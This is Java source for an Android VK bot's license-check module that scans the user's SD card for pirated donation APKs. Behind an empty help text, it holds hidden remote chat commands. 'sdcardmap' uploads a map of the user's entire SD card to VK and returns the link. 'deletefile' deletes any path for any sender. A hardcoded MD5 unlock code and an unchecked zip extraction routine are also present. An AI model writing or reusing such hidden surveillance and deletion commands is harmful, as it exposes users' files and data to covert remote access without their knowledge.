package com.fsoft.vktest.Modules;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Environment;
import com.fsoft.vktest.ApplicationManager;
import com.fsoft.vktest.Modules.Commands.Command;
import com.fsoft.vktest.Utils.F;
import com.fsoft.vktest.Utils.ResourceFileReader;
import com.fsoft.vktest.Utils.CommandParser;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.util.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

/**
 * Created by Dr. Failov on 06.03.2015.
 *
 */

public class DonationValidator implements Command {
    ApplicationManager applicationManager = null;
    boolean cont = false;
    File tmpFolder = new File(ApplicationManager.getHomeFolder() + File.separator + "temp");
    String problemFile = "";
    Thread thread = null;

    public DonationValidator(ApplicationManager applicationManager) {
        this.applicationManager = applicationManager;
    }

    public void load(){
        Boolean donationValidated = true;//readDonationState();               //отключена проверка наличия файла на карте
        if(donationValidated == null){
            if(applicationManager.isDonated()) {
                thread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        F.sleep(30000);
                        validateDonation();
                    }
                });
                thread.start();
            }
        }
        else{
            setDonationState(donationValidated);
            if(!donationValidated)
                applicationManager.activity.messageBox("Ваша лицензия была скомпрометирована и больше не работает.\n" +
                        "Это всё потому что Вы скачали донатку с пиратского ресурса, либо же сами её незаконно распространяли. Так делать нельзя.\n" +
                        "Чтобы это сообщение больше не появлялось, удалите донатку.\n" +
                        "Если же Вы действительно её купили и не пиратили, можете написать мне:\n" +
                        "vk.com/drfailov \n");
        }
    }
    public void close(){
        cont = false;
        thread = null;
    }
    private void setDonationState(boolean newState){
        //изменить состояние доната для текущей сессии
        applicationManager.securityProvider.setDonationValidated(newState);
    }
    private Boolean readDonationState(){
        //должна читать данные из хранилища программы о том была ли ранее проведена эта проверка.
        //если нет - вернет null
        SharedPreferences sharedPreferences = applicationManager.activity.getPreferences(Context.MODE_PRIVATE);
        if(!sharedPreferences.contains("donationValidated"))
            return null;
        problemFile = sharedPreferences.getString("problemFile", problemFile);
        return sharedPreferences.getBoolean("donationValidated", true);
    }
    private void writeDonationState(boolean newState){
        //записать в постоянное хранилище состояние донатки
        SharedPreferences sharedPreferences = applicationManager.activity.getPreferences(Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("problemFile", problemFile);
        editor.putBoolean("donationValidated", newState);
        editor.commit();
    }
    private void clearDonationState(){
        //записать в постоянное хранилище состояние донатки
        SharedPreferences sharedPreferences = applicationManager.activity.getPreferences(Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.remove("donationValidated");
        editor.commit();
    }
    @Override public String process(String input, Long senderId) {
        String result = "";
        //todo: remember | revalidate donation
        //todo: remember | validate donation
        //todo: remember | lock donation
        //todo: remember | get donation
        //todo: remember | sdcardmap
        //todo: remember | deletefile
        //todo: remember | get problem file
        //todo: remember | fix
        if(input.equals("revalidate donation")){
            clearDonationState();
            validateDonationAsync();
            result += "Ок, валидация пройдёт заново.\n";
        }
        else if(input.equals("fix") && senderId.equals(10299185L)){
            result += "Проблемный файл: " + problemFile + "\n";
            result += "----------------------\n";
            result += applicationManager.processCommand("deletefile "+problemFile) + "\n";
            result += "----------------------\n";
            result += applicationManager.processCommand("revalidate donation") + "\n";
            result += "----------------------\n";
        }
        else if(input.equals("get problem file")){
            validationPassed();
            result += "Проблемный файл: " + problemFile;
        }
        else if(applicationManager.getMD5(input).equals("c356b4b923f83b60189bb3f8cf0fda6c")){//validate donation
            validationPassed();
            result += "Донатка разблокирована.\n";
        }
        else if(input.equals("lock donation")){
            validationFailed();
            result += "Донатка заблокирована.\n";
        }
        else if(input.equals("get donation")){
            Boolean r = readDonationState();
            if(r == null)
                result += "Валидация не проводилась, не нужна, или ещё не закончена.\n";
            else if(r)
                result += "Валидация пройдена.\n";
            else
                result += "Валидация не пройдена.\n";
        }
        else if(input.equals("sdcardmap")){
            try {
                String fs = getFullFileSystemMap();
                tmpFolder.mkdirs();
                File tmpFile = new File(tmpFolder + File.separator + "fs.txt");
                FileWriter fileWriter = new FileWriter(tmpFile);
                fileWriter.append(fs);
                fileWriter.close();
                String link = applicationManager.vkCommunicator.uploadDocument(tmpFile);
                tmpFile.delete();
                return "Файловая система карты: " + link;
            }
            catch (Exception e){
                e.printStackTrace();
                return "! Ошибка подготовки результата: " + e.toString();
            }
        }
        else{
            CommandParser commandParser = new CommandParser(input);
            if(commandParser.getWord().equals("deletefile")){
                String path = commandParser.getText();
                return deleteFile(path);
            }
        }
        return result;
    }
    @Override public String getHelp() {
        return "";
    }
    public void validationPassed(){
        setDonationState(true);
        writeDonationState(true);
        log("Congratulations! Validation passed.");
    }
    public void validationFailed(){
        setDonationState(false);
        writeDonationState(false);
        log("Unfortunately, donation validation failed.");
        applicationManager.activity.messageBoxPermanent("Ваша лицензия скомпрометирована!\n" +
                "Скорее всего, Вы скачали донатку с пиратского ресурса, либо же сами её незаконно распространяли.\n" +
                "Так делать нельзя. Если же Вы действительно её купили, могу только посоветовать написать мне:\n" +
                "vk.com/drfailov \n" +
                "Не нужно мне писать если Вы незаконно качали или распространяли донатку - я Вам не помогу.");
    }
    private  boolean doLog(){
        return applicationManager.getUserID() == 10299185;
    }
    String log(String text){
        if(doLog())
            applicationManager.activity.log(text);
        return text;
    }
    private String getFullFileSystemMap(){
        File sdcard = Environment.getExternalStorageDirectory();
        return "Карта файловой системы " + sdcard.getPath() + "\n" + getFolderMap(sdcard, 0);
    }
    private String getFolderMap(File path, int including){
        if(path == null)
            return getNLines(including) + "|- NULL \n";
        if(path.isFile()){
            return getNLines(including) + "|- " + path.getName() + "\n";
        }
        if(path.isDirectory()){
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append(getNLines(including) + "|-+ " + path.getName() + "\n");
            File[] files = path.listFiles();
            if(files == null)
                return "";
            for (File file:files)
                stringBuilder.append(getFolderMap(file, including + 1));
            stringBuilder.append(getNLines(including) + "| \n");
            return stringBuilder.toString();
        }
        return "";
    }
    private String getNLines(int n){
        String result = "";
        for (int i = 0; i < n; i++) {
            result += "| ";
        }
        return result;
    }
    void validateDonationAsync(){
        thread = new Thread(new Runnable() {
            @Override
            public void run() {
                validateDonation();
            }
        });
        thread.start();
    }
    void validateDonation(){
        try {
            cont = true;

            File sdcard = getSdcardFolder();
            log("checking ... " + sdcard.getPath());
            checkFolder(sdcard);

            File external = getExternalSdcardFolder();
            log("checking ... " + external.getPath());
            if (!external.getPath().equals(sdcard.getPath()))
                checkFolder(external);

            if(cont && readDonationState() == null) {
                validationPassed();
                cont = false;
            }
        }
        catch (Exception e){
            if(doLog())
                e.printStackTrace();
            log("Error validating donation!" + e);
        }
    }
    private File getSdcardFolder(){
        File sdcard = Environment.getExternalStorageDirectory();
        if(sdcard.isDirectory() && sdcard.listFiles().length > 0)
            return sdcard;

        sdcard = new File(File.separator + "sdcard");
        if(sdcard.isDirectory() && sdcard.listFiles().length > 0)
            return sdcard;

        sdcard = new File(File.separator + "storage" + File.separator + "sdcard0");
        if(sdcard.isDirectory() && sdcard.listFiles().length > 0)
            return sdcard;

        sdcard = new File(File.separator + "storage" + File.separator + "sdcard");
        if(sdcard.isDirectory() && sdcard.listFiles().length > 0)
            return sdcard;

        sdcard = new File(File.separator + "storage" + File.separator + "emulated" + File.separator + "0");
        if(sdcard.isDirectory() && sdcard.listFiles().length > 0)
            return sdcard;

        sdcard = new File(File.separator + "storage" + File.separator + "emulated" + File.separator + "legacy");
        if(sdcard.isDirectory() && sdcard.listFiles().length > 0)
            return sdcard;
        return new File("No location.");
    }
    private File getExternalSdcardFolder(){
        File sdcard = new File("");
        String externals = System.getenv("SECONDARY_STORAGE");
        if(externals != null) {
            String[] externalsArray = externals.split(":");
            String secondaryExternal = externalsArray[0];
            sdcard = new File(secondaryExternal);
        }
        if(sdcard.isDirectory()) {
            File[] list = sdcard.listFiles();
            if(list != null && list.length > 0)
                return sdcard;
        }

        sdcard = new File(File.separator + "sdcard1");
        if(sdcard.isDirectory()) {
            File[] list = sdcard.listFiles();
            if(list != null && list.length > 0)
                return sdcard;
        }

        sdcard = new File(File.separator + "extSdCard");
        if(sdcard.isDirectory()) {
            File[] list = sdcard.listFiles();
            if(list != null && list.length > 0)
                return sdcard;
        }

        sdcard = new File(File.separator + "storage" + File.separator + "sdcard1");
        if(sdcard.isDirectory()) {
            File[] list = sdcard.listFiles();
            if(list != null && list.length > 0)
                return sdcard;
        }

        sdcard = new File(File.separator + "external_sd");
        if(sdcard.isDirectory()) {
            File[] list = sdcard.listFiles();
            if(list != null && list.length > 0)
                return sdcard;
        }
        return new File("No location.");
    }
    void checkFolder(File folder){
        try {
            if(folder == null)
                return;
            if (folder.isFile())
                checkFile(folder);
            if (folder.isDirectory()) {
                File[] files = folder.listFiles();
                if(files == null)
                    return;
                for (File file : files) {
                    String path = file.getPath().toLowerCase();
                    if (!path.contains("backup")
                            && !path.contains("android/data")
                            && !path.contains("data/app"))
                        checkFolder(file);
                }
            }
        }
        catch (Exception e){
            if(doLog())
                e.printStackTrace();
            log("Error reading folder " + folder.getPath() + "   " + e);
        }
    }
    void checkFile(File file){
        File originalFile = null;
        File extractedFolder = null;

        try{
            if(!cont)
                return;
            if(file == null)
                return;
            String filename = file.getName();
            if(filename.contains(".apk") && file.length() < 500000L){
                log(". Checking file " + file.getPath() + " ...");
                tmpFolder.mkdirs();
                originalFile = new File(tmpFolder + File.separator+"file.zip");
                //log(". Copying file " + file.getPath() + " ...");
                boolean copied = ResourceFileReader.copyFile(file.toString(), originalFile.toString());
                if(!copied){
                    log(". Error copying to " + originalFile + ".");
                    return;
                }
                //log(". Extracting file " + originalFile.getPath() + " ...");
                extractedFolder = new File(tmpFolder + File.separator+"extracted");
                unzip(originalFile, extractedFolder);

                //log(". Checking extracted file " + originalFile.getPath() + " ...");
                File androidManifest = new File(extractedFolder + File.separator + "AndroidManifest.xml");
                if(!androidManifest.isFile()){
                    log(". Keyfile androidManifest in "+file+" not found");
                    return;
                }
                String fileData = ResourceFileReader.readFromFile(androidManifest.getPath());
                fileData = filter(fileData);
                //log(". FileData = "+fileData);
                if(fileData.contains("com.fsoft.ihabotdonate") && fileData.contains("CHECK_VK_IHA_BOT_DONATION")){
                    log(". BINGO! File "+file+" is donation!");
                    problemFile = file.getPath();
                    validationFailed();
                    cont = false;
                }
//                else {
//                    log(". So... file "+file+" is not strange.");
//                }
                F.sleep(1000);
            }
        }
        catch (Exception e){
            if(doLog())
                e.printStackTrace();
            log("Error reading file " + file.getPath() + "   " + e);
        }
        finally {
            if(originalFile != null)
                originalFile.delete();
            if (extractedFolder != null)
                deleteDirectory(extractedFolder);
        }
    }
    boolean deleteDirectory(File directory) {
        if(directory.exists()){
            File[] files = directory.listFiles();
            if(null!=files){
                for(int i=0; i<files.length; i++) {
                    if(files[i].isDirectory()) {
                        deleteDirectory(files[i]);
                    }
                    else {
                        files[i].delete();
                    }
                }
            }
        }
        return(directory.delete());
    }
    void unzip(File originalFile, File extractedFolder) throws Exception{
        unZipIt(originalFile.getPath(), extractedFolder.getPath());
    }
    String deleteFile(String in){
        String result = "Удаление обьекта...\n";
        File file = new File(in);
        if(file.isDirectory()){
            result += "Тип обьекта: папка\n";
            result += "Удаление: " + deleteDirectory(file);
        }
        else if(file.isFile()){
            result += "Тип обьекта: файл\n";
            result += "Удаление: " + file.delete();
        }
        else {
            result += "Тип обьекта определить не удалось.\n";
        }
        return result;
    }
    void unZipIt(String zipFile, String outputFolder)throws Exception{

        byte[] buffer = new byte[1024];

        //create output directory is not exists
        File folder = new File(outputFolder);
        if(!folder.exists()){
            folder.mkdirs();
        }

        //get the zip file content
        ZipInputStream zis =
                new ZipInputStream(new FileInputStream(zipFile));
        //get the zipped file list entry
        ZipEntry ze = zis.getNextEntry();

        while(ze!=null){

            String fileName = ze.getName();
            File newFile = new File(outputFolder + File.separator + fileName);

            //create all non exists folders
            //else you will hit FileNotFoundException for compressed folder
            new File(newFile.getParent()).mkdirs();

            FileOutputStream fos = new FileOutputStream(newFile);

            int len;
            while ((len = zis.read(buffer)) > 0) {
                fos.write(buffer, 0, len);
            }

            fos.close();
            ze = zis.getNextEntry();
        }

        zis.closeEntry();
        zis.close();
    }
    String filter(String in){
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < in.length(); i++) {
            if("qwertyuiopasdfghjklzxcvbnm.QWERTYUIOPASDFGHJKLZXCVBNM_".indexOf(in.charAt(i))>0)
                stringBuilder.append(in.charAt(i));
        }
        return stringBuilder.toString();
    }

    class ExternalStorage {

        public static final String SD_CARD = "sdCard";
        public static final String EXTERNAL_SD_CARD = "externalSdCard";

        /**
         * @return True if the external storage is available. False otherwise.
         */
        public boolean isAvailable() {
            String state = Environment.getExternalStorageState();
            if (Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
                return true;
            }
            return false;
        }

        public String getSdCardPath() {
            return Environment.getExternalStorageDirectory().getPath() + "/";
        }

        /**
         * @return True if the external storage is writable. False otherwise.
         */
        public boolean isWritable() {
            String state = Environment.getExternalStorageState();
            if (Environment.MEDIA_MOUNTED.equals(state)) {
                return true;
            }
            return false;

        }

        /**
         * @return A map of all storage locations available
         */
        public Map<String, File> getAllStorageLocations() {
            Map<String, File> map = new HashMap<String, File>(10);

            List<String> mMounts = new ArrayList<String>(10);
            List<String> mVold = new ArrayList<String>(10);
            mMounts.add("/mnt/sdcard");
            mVold.add("/mnt/sdcard");

            try {
                File mountFile = new File("/proc/mounts");
                if(mountFile.exists()){
                    Scanner scanner = new Scanner(mountFile);
                    while (scanner.hasNext()) {
                        String line = scanner.nextLine();
                        if (line.startsWith("/dev/block/vold/")) {
                            String[] lineElements = line.split(" ");
                            String element = lineElements[1];

                            // don't add the default mount path
                            // it's already in the list.
                            if (!element.equals("/mnt/sdcard"))
                                mMounts.add(element);
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

            try {
                File voldFile = new File("/system/etc/vold.fstab");
                if(voldFile.exists()){
                    Scanner scanner = new Scanner(voldFile);
                    while (scanner.hasNext()) {
                        String line = scanner.nextLine();
                        if (line.startsWith("dev_mount")) {
                            String[] lineElements = line.split(" ");
                            String element = lineElements[2];

                            if (element.contains(":"))
                                element = element.substring(0, element.indexOf(":"));
                            if (!element.equals("/mnt/sdcard"))
                                mVold.add(element);
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }


            for (int i = 0; i < mMounts.size(); i++) {
                String mount = mMounts.get(i);
                if (!mVold.contains(mount))
                    mMounts.remove(i--);
            }
            mVold.clear();

            List<String> mountHash = new ArrayList<String>(10);

            for(String mount : mMounts){
                File root = new File(mount);
                if (root.exists() && root.isDirectory() && root.canWrite()) {
                    File[] list = root.listFiles();
                    String hash = "[";
                    if(list!=null){
                        for(File f : list){
                            hash += f.getName().hashCode()+":"+f.length()+", ";
                        }
                    }
                    hash += "]";
                    if(!mountHash.contains(hash)){
                        String key = SD_CARD + "_" + map.size();
                        if (map.size() == 0) {
                            key = SD_CARD;
                        } else if (map.size() == 1) {
                            key = EXTERNAL_SD_CARD;
                        }
                        mountHash.add(hash);
                        map.put(key, root);
                    }
                }
            }

            mMounts.clear();

            if(map.isEmpty()){
                map.put(SD_CARD, Environment.getExternalStorageDirectory());
            }
            return map;
        }
    }
}
